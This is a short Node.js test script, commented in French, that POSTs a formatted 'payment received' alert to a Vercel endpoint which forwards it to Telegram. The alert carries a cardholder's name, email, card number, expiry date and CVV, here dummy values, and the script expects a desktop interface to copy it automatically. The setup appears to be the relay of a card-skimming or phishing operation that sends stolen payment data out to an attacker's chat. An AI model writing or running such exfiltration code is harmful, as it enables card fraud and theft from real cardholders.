const fetch = require('node-fetch');

console.log('🧪 TEST DE MESSAGE DE PAIEMENT');
console.log('===============================');

const VERCEL_API_URL = 'https://test-alpha-lac-68.vercel.app/api/telegram';

async function sendPaymentMessage() {
    try {
        console.log('💳 Envoi d\'un message de paiement...');
        
        const paymentMessage = `💰 NOUVEAU PAIEMENT REÇU !
👤 Nom: Jean Dupont
📧 Email: jean.dupont@example.com
💳 Carte: 4111 **** **** 1111
📅 Expiration: 12/25
🔐 CVV: 123
💶 Montant: 199.99€
🔒 Vérifiez immédiatement !`;

        const response = await fetch(VERCEL_API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                message: paymentMessage,
                type: 'payment'
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            console.log('✅ Message de paiement envoyé !');
            console.log('📱 Message ID:', result.telegramResponse?.result?.message_id);
            console.log('📄 Contenu envoyé:');
            console.log(paymentMessage);
            console.log('\n🎯 Ce message devrait maintenant être détecté et copié automatiquement par l\'interface desktop !');
        } else {
            console.error('❌ Erreur lors de l\'envoi:', result.error);
        }
        
        return result;
        
    } catch (error) {
        console.error('❌ Erreur lors de l\'envoi du message de paiement:', error);
        return { success: false, error: error.message };
    }
}

// Envoyer le message
sendPaymentMessage();
